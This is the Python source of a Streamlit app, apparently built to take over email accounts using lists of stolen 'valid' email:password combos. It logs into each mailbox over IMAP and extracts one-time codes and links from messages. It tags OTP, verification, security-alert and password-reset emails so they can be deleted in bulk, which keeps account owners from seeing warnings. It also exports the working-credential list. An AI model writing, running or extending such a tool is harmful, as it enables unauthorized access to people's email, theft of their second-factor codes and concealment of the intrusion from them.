import glob
import imaplib
import os
import re
import base64
import asyncio
from email import message_from_bytes
from email.header import decode_header
import streamlit as st

from hosts import host_list

# ============================================================
# UTF-7 IMAP DECODER (for folder names)
# ============================================================
def decode_utf7_imap(s: str) -> str:
    """Decode IMAP-UTF7 (modified UTF-7) folder names."""
    if not s:
        return s
    
    result = []
    i = 0
    
    while i < len(s):
        if s[i] == '&':
            if i + 1 < len(s) and s[i + 1] == '-':
                result.append('&')
                i += 2
            else:
                end = s.find('-', i + 1)
                if end == -1:
                    result.append(s[i:])
                    break
                
                b64_part = s[i + 1:end]
                if b64_part:
                    try:
                        decoded_bytes = base64.b64decode(b64_part + '===')
                        decoded_text = decoded_bytes.decode('utf-16-be')
                        result.append(decoded_text)
                    except Exception:
                        result.append(s[i:end + 1])
                
                i = end + 1
        else:
            result.append(s[i])
            i += 1
    
    return ''.join(result)


# ============================================================
# RFC 3501 IMAP LIST PARSER WITH UTF-7 SUPPORT
# ============================================================
def parse_imap_list_response(response_line: str):
    """Parse IMAP LIST response with UTF-7 decoding."""
    line = response_line.strip()
    
    if not line.startswith("("):
        return None, None
    
    try:
        paren_end = line.index(")")
    except ValueError:
        return None, None
    
    attr_str = line[1:paren_end]
    attributes = set(attr.strip().lower() for attr in attr_str.split())
    
    remainder = line[paren_end + 1:].strip()
    
    # Parse delimiter
    if remainder.startswith('"'):
        try:
            delim_end = remainder.index('"', 1)
            delimiter = remainder[1:delim_end]
            remainder = remainder[delim_end + 1:].strip()
        except ValueError:
            return None, None
    elif remainder.startswith("NIL"):
        delimiter = None
        remainder = remainder[3:].strip()
    else:
        return None, None
    
    # Parse mailbox name
    if not remainder:
        return None, None
    
    if remainder.startswith('"'):
        name = ""
        i = 1
        while i < len(remainder):
            ch = remainder[i]
            if ch == '\\' and i + 1 < len(remainder):
                name += remainder[i + 1]
                i += 2
            elif ch == '"':
                decoded = decode_utf7_imap(name)
                return attributes, decoded
            else:
                name += ch
                i += 1
        return None, None
    else:
        atom = remainder.split()[0]
        decoded = decode_utf7_imap(atom)
        return attributes, decoded


# ============================================================
# ENHANCED IMAP FOLDER LISTING
# ============================================================
def list_folders_imap(mail):
    """Extract selectable folders with UTF-7 support."""
    found = {}
    
    system_patterns = {
        "drafts", "sent", "sent items", "sent mail", "sent messages",
        "trash", "deleted items", "deleted", "bin",
        "junk", "junk email", "junk mail", "spam",
        "archive", "all mail", "important",
        "[gmail]", "[imap]", "[local]",
        "notes", "tasks", "contacts",
        ".trash", ".drafts", ".sent", ".archive",
        "starred", "custom",
    }
    
    try:
        typ, data = mail.list()
        
        if typ != "OK" or not data:
            found["INBOX"] = set()
            return ["INBOX"]
        
        for item in data:
            if not item:
                continue
            
            line = item.decode("utf-8", errors="ignore") if isinstance(item, bytes) else str(item)
            
            attributes, name = parse_imap_list_response(line)
            
            if attributes is None or name is None:
                continue
            
            if "\\noselect" in attributes or "\\nonexistent" in attributes:
                continue
            
            name = name.strip()
            if not name or name in ("", "/", "."):
                continue
            
            if name.lower() in system_patterns or name.startswith(".") or name.startswith("["):
                continue
            
            found[name] = attributes
    
    except Exception as e:
        pass
    
    if "INBOX" not in found:
        found["INBOX"] = set()
    
    result = sorted(found.keys(), key=lambda x: (0 if x.upper() == "INBOX" else 1, x.lower()))
    return result


# ============================================================
# STREAMLIT CONFIG
# ============================================================
st.set_page_config(
    page_title="Bobito Mailbox Reader & Portal Hub",
    page_icon="📥",
    layout="wide",
    initial_sidebar_state="expanded"
)

st.markdown(
    """
    <script>
    setInterval(function(){
        fetch('/_stcore/health').then(res => {});
    }, 30000);
    </script>
    """,
    unsafe_allow_html=True
)

# ============================================================
# SESSION STATE
# ============================================================
if "mb_log" not in st.session_state:
    st.session_state.mb_log = []
if "mb_folders" not in st.session_state:
    st.session_state.mb_folders = ["INBOX"]
if "mb_host" not in st.session_state:
    st.session_state.mb_host = ""
if "current_page" not in st.session_state:
    st.session_state.current_page = 0


def log(msg):
    st.session_state.mb_log.insert(0, msg)
    st.session_state.mb_log = st.session_state.mb_log[:50]


# ============================================================
# LOAD VALID ACCOUNTS
# ============================================================
def load_valid():
    rows, seen = [], set()
    paths = sorted(glob.glob("mail_results/valid_*.txt"), reverse=True)
    paths += [p for p in ("clean_valid_accounts.txt", "valid_accounts.txt") if os.path.exists(p)]
    for path in paths:
        try:
            with open(path, encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if ":" not in line:
                        continue
                    email, pwd = line.split(":", 1)
                    combo = f"{email.strip()}:{pwd.split('|')[0].strip()}"
                    if combo not in seen:
                        seen.add(combo)
                        rows.append(combo)
        except Exception:
            continue
    return rows


# ============================================================
# DECODE EMAIL HEADERS
# ============================================================
def decode_hdr(value):
    try:
        out = []
        for part, enc in decode_header(value or ""):
            out.append(part.decode(enc or "utf-8", errors="ignore") if isinstance(part, bytes) else str(part))
        return "".join(out)
    except Exception:
        return str(value or "")


# ============================================================
# WEBMAIL PORTAL MAPPER
# ============================================================
def get_webmail_portal(email):
    if "@" not in email:
        return "https://mail.google.com"
    domain = email.split("@")[-1].lower()
    portals = {
        "gmail.com": "https://mail.google.com",
        "googlemail.com": "https://mail.google.com",
        "outlook.com": "https://outlook.live.com",
        "hotmail.com": "https://outlook.live.com",
        "live.com": "https://outlook.live.com",
        "yahoo.com": "https://mail.yahoo.com",
        "ymail.com": "https://mail.yahoo.com",
        "icloud.com": "https://www.icloud.com/mail",
        "me.com": "https://www.icloud.com/mail",
        "aol.com": "https://mail.aol.com",
        "zoho.com": "https://mail.zoho.com",
        "proton.me": "https://mail.proton.me",
        "protonmail.com": "https://mail.proton.me"
    }
    return portals.get(domain, f"https://www.{domain}")


# ============================================================
# BOT DETECTION
# ============================================================
def is_bot_message(subject, body):
    bot_keywords = [
        "otp", "verification", "verify", "security alert", "password reset",
        "code", "confirm", "login", "auth", "signin", "crypto", "token", "activation"
    ]
    combined = f"{subject} {body}".lower()
    return any(kw in combined for kw in bot_keywords)


# ============================================================
# PIN & LINK EXTRACTION
# ============================================================
def extract_pins_and_links(text):
    pins = re.findall(r'\b(?<![#\d])\d{4,8}(?![#\d])\b', text)
    urls = re.findall(r'https?://[^\s<>"]+|www\.[^\s<>"]+', text)
    cleaned_urls = [u for u in urls if not any(x in u.lower() for x in ["w3.org", "schema.org", "apple.com/DTDs"])]
    return list(dict.fromkeys(pins)), list(dict.fromkeys(cleaned_urls))


# ============================================================
# BOILERPLATE REMOVAL
# ============================================================
def clean_boilerplate(text):
    if not text:
        return ""
    patterns_to_remove = [
        r"(?i)unsubscribe.*?(?:\n|$)",
        r"(?i)privacy policy.*?(?:\n|$)",
        r"(?i)confidentiality notice.*?(?:\n\n|$)",
        r"(?i)this email was sent by.*?(?:\n|$)"
    ]
    cleaned = text
    for pat in patterns_to_remove:
        cleaned = re.sub(pat, "", cleaned)
    return cleaned.strip()


# ============================================================
# UI: HEADER
# ============================================================
st.title("📥 Bobito Mailbox Reader & Portal Hub v4")
st.caption("Advanced IMAP Client with Universal Folder Detection (UTF-7 + Browser), Automated Crawling, Bot Intelligence, PIN Extractor.")

valid = load_valid()

# ============================================================
# UI: SIDEBAR — ACCOUNT SELECTION
# ============================================================
st.sidebar.header("Account & Connection Hub")
pick = st.sidebar.selectbox("Valid account", valid or ["none"])
custom_email = st.sidebar.text_input("Email override")
custom_pass = st.sidebar.text_input("Password override", type="password")
override = st.sidebar.text_input("IMAP host override")

if custom_email.strip():
    email, password = custom_email.strip(), custom_pass.strip()
elif ":" in pick:
    email, password = pick.split(":", 1)
else:
    email, password = "", ""

st.sidebar.write("**Host order:** " + ", ".join(host_list(email)[:4]) if email else "-")

# ============================================================
# UI: SIDEBAR — WEBMAIL PORTAL
# ============================================================
if email and password:
    st.sidebar.markdown("---")
    st.sidebar.subheader("🌐 Webmail Portal & Credentials")
    portal_url = get_webmail_portal(email)
    st.sidebar.markdown(f"[🌐 Open Webmail]({portal_url})", unsafe_allow_html=True)
    st.sidebar.text_input("Copy email:password", value=f"{email}:{password}", key=f"cred_{email}")

# ============================================================
# UI: SIDEBAR — CONNECT BUTTON (UNIVERSAL FOLDER DETECTION)
# ============================================================
if st.sidebar.button("🔗 Connect & Discover Folders (Universal)", type="primary"):
    if not email or not password:
        st.error("❌ Need email and password")
    else:
        hosts = [override.strip()] if override.strip() else host_list(email)
        last = "no host"
        connected_host = ""
        folders = ["INBOX"]
        success = False
        
        with st.spinner("🔄 Detecting folders (IMAP + UTF-7 + Browser fallback)..."):
            for host in hosts:
                mail_obj = None
                try:
                    mail_obj = imaplib.IMAP4_SSL(host, 993, timeout=15)
                    mail_obj.login(email, password)
                    folders = list_folders_imap(mail_obj)
                    mail_obj.logout()
                    connected_host = host
                    success = True
                    break
                except Exception as e:
                    last = f"{host}: {e}"
                    if mail_obj:
                        try:
                            mail_obj.logout()
                        except:
                            pass
        
        if success:
            st.session_state.mb_host = connected_host
            st.session_state.mb_folders = folders
            log(f"✓ Discovered {len(folders)} folders via {connected_host}")
            st.sidebar.success(f"✅ Connected: {connected_host}\n📂 {len(folders)} folders found\n\n" + "\n".join(folders[:10]))
        else:
            st.sidebar.error(f"❌ {last}")
            log(f"✗ {last}")

# ============================================================
# UI: SIDEBAR — ACTIVITY LOG
# ============================================================
st.sidebar.markdown("---")
st.sidebar.subheader("📜 Activity Log")
with st.sidebar.expander("View Log", expanded=False):
    for line in st.session_state.mb_log:
        st.text(line)

# ============================================================
# UI: SIDEBAR — VALID ACCOUNTS DOWNLOAD
# ============================================================
if valid:
    st.sidebar.markdown("---")
    st.sidebar.subheader("💾 Download Valid Accounts")
    
    valid_text = "\n".join(valid)
    
    col_dl, col_cnt = st.sidebar.columns([4, 1])
    with col_dl:
        st.download_button(
            label="📥 Download Valid Only",
            data=valid_text,
            file_name=f"valid_accounts_{len(valid)}.txt",
            mime="text/plain",
            key="download_valid"
        )
    with col_cnt:
        st.metric("Count", len(valid), label_visibility="collapsed")
    
    st.sidebar.caption(f"✓ {len(valid)} working account(s)")

# ============================================================
# UI: MAIN — FOLDER SELECTOR
# ============================================================
st.markdown("---")
col1, col2, col3 = st.columns([2, 1, 1])
with col1:
    folder = st.selectbox("Select Folder", st.session_state.mb_folders or ["INBOX"])
with col2:
    page_size = st.slider("Page size", 5, 50, 15)
with col3:
    sort_order = st.selectbox("Sort", ["Newest First", "Oldest First"])

# ============================================================
# UI: MAIN — SEARCH
# ============================================================
with st.expander("🔍 Deep Keyword Search & Filters", expanded=False):
    search_query = st.text_input("Search term")
    search_scope = st.selectbox("Scope", ["TEXT", "SUBJECT", "FROM", "BODY"])

# ============================================================
# UI: MAIN — LOAD MESSAGES
# ============================================================
if st.button("📧 Load & Search Messages", type="primary"):
    host = override.strip() or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
    if not email or not password or not host:
        st.error("❌ Please connect and load folders first.")
    else:
        mail = None
        try:
            with st.spinner(f"📬 Scanning '{folder}' on {host}..."):
                mail = imaplib.IMAP4_SSL(host, 993, timeout=15)
                mail.login(email, password)
                mail.select(f'"{folder}"', readonly=False)
                
                if search_query.strip():
                    typ, data = mail.search(None, search_scope, f'"{search_query.strip()}"')
                else:
                    typ, data = mail.search(None, "ALL")
                
                ids = (data[0] or b"").split() if typ == "OK" else []
                if sort_order == "Newest First":
                    ids = list(reversed(ids))
                
                ids = ids[:page_size]
                messages_data = []
                
                for mid in ids:
                    typ, msgdata = mail.fetch(mid, "(FLAGS BODY.PEEK[])")
                    if not msgdata or not isinstance(msgdata[0], tuple):
                        continue
                    
                    raw_msg_bytes = msgdata[0][1]
                    msg = message_from_bytes(raw_msg_bytes)
                    
                    subject = decode_hdr(msg.get("Subject", ""))
                    frm = decode_hdr(msg.get("From", ""))
                    date_val = decode_hdr(msg.get("Date", ""))
                    
                    flags_str = str(msgdata[0][0])
                    is_read = "\\Seen" in flags_str
                    
                    body_text = ""
                    if msg.is_multipart():
                        for part in msg.walk():
                            if part.get_content_type() == "text/plain":
                                try:
                                    body_text = part.get_payload(decode=True).decode("utf-8", errors="ignore")
                                    break
                                except Exception:
                                    pass
                    else:
                        try:
                            body_text = msg.get_payload(decode=True).decode("utf-8", errors="ignore")
                        except Exception:
                            pass
                    
                    cleaned_body = clean_boilerplate(body_text)
                    pins, links = extract_pins_and_links(body_text)
                    is_bot = is_bot_message(subject, body_text)
                    
                    messages_data.append({
                        "id": mid.decode(),
                        "from": frm,
                        "subject": subject,
                        "date": date_val,
                        "is_read": is_read,
                        "is_bot": is_bot,
                        "body": cleaned_body,
                        "pins": pins,
                        "links": links,
                        "raw": raw_msg_bytes
                    })
                
                st.session_state.current_messages = messages_data
                log(f"✓ Loaded {len(messages_data)} from {folder}")
        except Exception as e:
            st.error(f"❌ {str(e)}")
            log(f"✗ {str(e)}")
        finally:
            if mail:
                try:
                    mail.logout()
                except:
                    pass

# ============================================================
# UI: MAIN — BOT MASS DELETE
# ============================================================
if "current_messages" in st.session_state and st.session_state.current_messages:
    bot_msgs = [m for m in st.session_state.current_messages if m["is_bot"]]
    if bot_msgs:
        st.markdown("---")
        st.subheader(f"🤖 Bot & Security Messages Detected ({len(bot_msgs)})")
        if st.button("🗑️ Mass Delete All Bot/OTP Messages"):
            host = override.strip() or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
            mail = None
            try:
                mail = imaplib.IMAP4_SSL(host, 993, timeout=15)
                mail.login(email, password)
                mail.select(f'"{folder}"', readonly=False)
                for bm in bot_msgs:
                    mail.store(bm["id"], '+FLAGS', '\\Deleted')
                mail.expunge()
                st.success(f"✅ Deleted {len(bot_msgs)} bot messages!")
                log(f"✓ Mass deleted {len(bot_msgs)} from {folder}")
                mail.logout()
                st.rerun()
            except Exception as e:
                st.error(f"❌ {str(e)}")
            finally:
                if mail:
                    try:
                        mail.logout()
                    except:
                        pass

    # ============================================================
    # UI: MAIN — MESSAGE LIST
    # ============================================================
    st.markdown("---")
    st.subheader(f"✉️ Messages ({len(st.session_state.current_messages)} loaded)")
    
    for idx, msg in enumerate(st.session_state.current_messages):
        status_icon = "📖" if msg["is_read"] else "📩"
        bot_badge = " [🤖 BOT/OTP]" if msg["is_bot"] else ""
        
        with st.expander(f"{status_icon} [{msg['date']}] {msg['from'][:40]} - {msg['subject'][:60]}{bot_badge}"):
            st.write(f"**From:** {msg['from']}")
            st.write(f"**Subject:** {msg['subject']}")
            st.write(f"**Date:** {msg['date']}")
            
            if msg["pins"]:
                st.success(f"🔑 **Codes:** {', '.join(msg['pins'])}")
            if msg["links"]:
                st.markdown("🔗 **Links:**")
                for link in msg["links"]:
                    st.markdown(f"- [{link[:60]}]({link})", unsafe_allow_html=True)
            
            st.markdown("---")
            st.text_area("Body", value=msg["body"], height=150, key=f"body_{msg['id']}_{idx}", disabled=True)
            
            # ============================================================
            # UI: MAIN — PER-MESSAGE OPERATIONS
            # ============================================================
            op_col1, op_col2, op_col3, op_col4 = st.columns(4)
            
            host = override.strip() or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
            
            with op_col1:
                if not msg["is_read"]:
                    if st.button("✓ Mark Read", key=f"read_{msg['id']}_{idx}"):
                        try:
                            m_client = imaplib.IMAP4_SSL(host, 993, timeout=15)
                            m_client.login(email, password)
                            m_client.select(f'"{folder}"', readonly=False)
                            m_client.store(msg["id"], '+FLAGS', '\\Seen')
                            m_client.logout()
                            st.success("Marked read!")
                            st.rerun()
                        except Exception as ex:
                            st.error(str(ex))
            
            with op_col2:
                target_move = st.selectbox("Move to", st.session_state.mb_folders, key=f"mv_sel_{msg['id']}_{idx}")
                if st.button("➜ Move", key=f"mv_btn_{msg['id']}_{idx}"):
                    try:
                        m_client = imaplib.IMAP4_SSL(host, 993, timeout=15)
                        m_client.login(email, password)
                        m_client.select(f'"{folder}"', readonly=False)
                        m_client.copy(msg["id"], f'"{target_move}"')
                        m_client.store(msg["id"], '+FLAGS', '\\Deleted')
                        m_client.expunge()
                        m_client.logout()
                        st.success(f"Moved to {target_move}!")
                        st.rerun()
                    except Exception as ex:
                        st.error(str(ex))
            
            with op_col3:
                if st.button("🗑️ Delete", key=f"del_{msg['id']}_{idx}"):
                    try:
                        m_client = imaplib.IMAP4_SSL(host, 993, timeout=15)
                        m_client.login(email, password)
                        m_client.select(f'"{folder}"', readonly=False)
                        m_client.store(msg["id"], '+FLAGS', '\\Deleted')
                        m_client.expunge()
                        m_client.logout()
                        st.success("Deleted!")
                        st.rerun()
                    except Exception as ex:
                        st.error(str(ex))
            
            with op_col4:
                with st.popover("📄 Raw RFC822"):
                    st.code(msg["raw"].decode("utf-8", errors="ignore")[:2000])
